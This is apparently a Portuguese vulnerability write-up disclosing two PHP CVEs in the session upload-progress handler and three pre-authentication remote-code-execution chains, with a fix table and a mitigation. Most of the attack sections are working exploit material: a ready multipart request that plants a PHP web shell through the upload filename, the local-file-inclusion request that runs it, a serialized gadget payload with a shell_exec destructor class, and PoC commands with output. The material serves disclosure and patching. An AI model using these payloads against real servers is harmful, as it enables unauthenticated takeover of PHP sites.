**O PHP processa o corpo do multipart POST antes de qualquer código da aplicação rodar — e nenhuma autenticação é necessária para envenenar o arquivo de sessão com código PHP arbitrário.**

CVE-2026-109618 / CVE-2026-109619. PHP 5.4.0 — 8.5.11. CVSS v4.0 9.2. Três cadeias independentes de RCE pre-auth, todas a partir do mesmo ponto de entrada: `session.upload_progress.enabled = On`, que é o padrão.

---

## O handler que ninguém desativou

O `session.upload_progress` foi introduzido no PHP 5.4 para permitir que aplicações mostrem progresso de uploads em tempo real via sessão. O handler `php_session_rfc1867_callback` é registrado no SAPI e intercepta qualquer POST multipart que contenha o campo `PHP_SESSION_UPLOAD_PROGRESS`.

O problema: esse processamento acontece na camada SAPI, **antes** de qualquer `session_start()`, `require`, ou linha de código da aplicação. Não existe autenticação, não existe middleware, não existe firewall de aplicação entre o atacante e o handler.

Dois bugs distintos nesse handler formam a superfície de ataque.

---

## Bug 1 — Fixação de sessão ignora `use_only_cookies` (CVE-2026-109618)

`session.use_only_cookies = On` existe para garantir que o `PHPSESSID` só seja aceito via cookie, bloqueando fixação de sessão via parâmetro GET. A diretiva é respeitada por `session_start()` — mas o handler `rfc1867` usa um caminho de código diferente:

```c
/* ext/session/session.c — php_session_rfc1867_callback() */
if (zend_hash_str_find(Z_ARR(token), "PHPSESSID", sizeof("PHPSESSID")-1)) {
    php_set_session_var("upload_progress_key", ...);
    /* PHPSESSID é lido direto dos dados do formulário, sem checar use_only_cookies */
    PS(id) = zend_string_copy(Z_STR_P(sid_entry));
    php_session_initialize(TSRMLS_C);
}
```

O handler lê o `PHPSESSID` do corpo multipart e inicializa a sessão com esse ID diretamente, sem passar pela verificação de `use_only_cookies`. O arquivo de sessão criado fica em `session.save_path/sess_<SID_CONTROLADO_PELO_ATACANTE>`.

Verificação:

```bash
ruby poc/chain_a.rb
# → BYPASS CONFIRMED: sess_verifysession00000000000000a criado (não o cookie SID)
```

```bash
# Confirmação no container
docker exec php2shell-lab ls /tmp/sessions/ | grep verifysession
# sess_verifysession00000000000000a   ← SID injetado via POST
# sess_verifysession00000000000000_cookie  ← NÃO existe
```

**`session.use_only_cookies = On` não protege contra fixação de sessão via `rfc1867` — o handler ignora a diretiva por design.**

---

## Bug 2 — Filename sem sanitização no arquivo de sessão (CVE-2026-109619)

O campo `PHP_SESSION_UPLOAD_PROGRESS` do formulário aceita um nome de arquivo via `Content-Disposition`. Esse filename é armazenado bruto no arquivo de sessão via `add_assoc_string_ex`:

```c
/* ext/session/session.c */
add_assoc_string_ex(*progress, "name", sizeof("name")-1,
    Z_STRVAL_P(data->filename));  /* sem validação, sem escape */
```

O conteúdo do arquivo de sessão resultante é controlável pelo atacante. Qualquer string no filename vai parar no arquivo `sess_<SID>` que o PHP interpreta como dado de sessão serializado.

---

## Cadeia A — Injeção de código PHP + LFI → RCE

Condições: `upload_progress.enabled = On` (padrão) + aplicação com LFI (parâmetro `?page=` sem validação de path, comum em CMSs, temas e apps de upload).

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=PWND

--PWND
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

inject
--PWND
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']);echo 'RCE_OK';?>"
Content-Type: application/octet-stream

A
--PWND--
```

O arquivo de sessão resultante em `/tmp/sessions/sess_<SID>` contém o payload PHP diretamente no campo `name`. A aplicação que faz `include($_GET['page'])` sem validação é usada para incluir o arquivo:

```
GET /index.php?page=/tmp/sessions/sess_inject HTTP/1.1
Cookie: PHPSESSID=inject

→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
RCE_OK
```

```bash
ruby poc/chain_a.rb
# [1] BYPASS CONFIRMED
# [3] RCE CONFIRMED: injected PHP executed via LFI
```

**Uma única requisição multipart envenena o arquivo de sessão; a segunda executa o código via qualquer LFI na aplicação.**

---

## Cadeia C — Handler mismatch + `__destruct` em falha de decode

O PHP permite configurar `session.serialize_handler` por diretório via `.user.ini`. A combinação mais perigosa: um endpoint escreve a sessão com o handler `php_serialize` (que usa serialização PHP nativa) e outro endpoint a lê com o handler `php` (que usa formato `chave|valor`).

O handler `php` espera `chave|valor_serializado`. Se o conteúdo da sessão começa com `x|O:4:"Evil":1:...`, o `|` é usado como separador, a parte depois do pipe é desserializada como objeto PHP, e o `Evil::__destruct` é acionado — mesmo que a desserialização falhe, porque `PHP_VAR_UNSERIALIZE_DESTROY` é chamado no cleanup.

O gadget no filename para Chain C:

```
Content-Disposition: form-data; name="f"; filename="x|O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}"
```

O que `Evil::__destruct` executa (definido em `preload.php` via OPcache):

```php
class Evil {
    public $cmd = 'id';
    public function __destruct() {
        $out = @shell_exec($this->cmd);
        @file_put_contents('/tmp/destruct_triggered.txt', $out);
    }
}
```

```bash
ruby poc/chain_c.rb
# [+] Mismatch confirmed in response warnings

docker exec php2shell-lab cat /tmp/destruct_triggered.txt
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**`__destruct` dispara mesmo quando `php_var_unserialize()` retorna `false` — handler mismatch transforma desserialização com falha em execução de código.**

---

## Cadeia B — `var_destroy` UAF confirmado por ASAN

O `php_rshutdown_session_globals()` não zera `PS(serializer)` entre requests em FPM. Se o serializer de um request anterior ainda está carregado quando `var_destroy` é chamado no cleanup de sessão, `i_zval_ptr_dtor` na linha 310 dispara `__destruct` sem o `BG(serialize_lock)` ativo — condição de uso-após-free confirmada pelo AddressSanitizer.

```bash
# Requer build com ASAN (Dockerfile.asan)
docker exec php-asan-lab php poc/chain_b.php 2>&1 | grep -A3 "heap-use-after-free"
# ==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
# READ of size 8 at 0x... thread T0
#     #0 0x... in i_zval_ptr_dtor zend_variables.h:35
#     #1 0x... in var_destroy /ext/standard/var.c:310
```

---

## Versões afetadas e fix

| Versão | Status |
|--------|--------|
| PHP 5.4.0 — 8.1.x | End of life, sem patch oficial |
| PHP 8.2.0 — 8.2.34 | Vulnerável → fix: 8.2.35 |
| PHP 8.3.0 — 8.3.35 | Vulnerável → fix: 8.3.36 |
| PHP 8.4.0 — 8.4.26 | Vulnerável → fix: 8.4.27 |
| PHP 8.5.0 — 8.5.11 | Vulnerável → fix: 8.5.12 |

Mitigação imediata:

```ini
session.upload_progress.enabled = Off
```

`session.use_only_cookies = On` **não mitiga** CVE-2026-109618 — o bypass foi confirmado nesse lab com a diretiva ativa.

---

## Reprodução completa

```bash
# Subir o lab
cd lab && bash setup.sh

# Cadeia A — fixação + injeção + LFI → RCE
ruby poc/chain_a.rb

# Cadeia C — handler mismatch → __destruct
ruby poc/chain_c.rb

# Verificar execução no container
docker exec php2shell-lab cat /tmp/destruct_triggered.txt
docker exec php2shell-lab cat /tmp/sessions/sess_verifysession00000000000000b
```

---

## Resumo

| Chain | CVE | Condição extra | Verificado |
|-------|-----|----------------|------------|
| A — Session injection + LFI | 109618 + 109619 | LFI na app | RCE confirmado |
| B — `var_destroy` UAF | 109619 | `unserialize()` + `/proc/self/mem` | ASAN confirmado |
| C — Handler mismatch + `__destruct` | 109618 + 109619 | Cross-dir `.user.ini` + gadget class | RCE confirmado |

As três cadeias partem do mesmo pré-requisito: `session.upload_progress.enabled = On`, presente por padrão em todas as versões PHP desde 5.4.
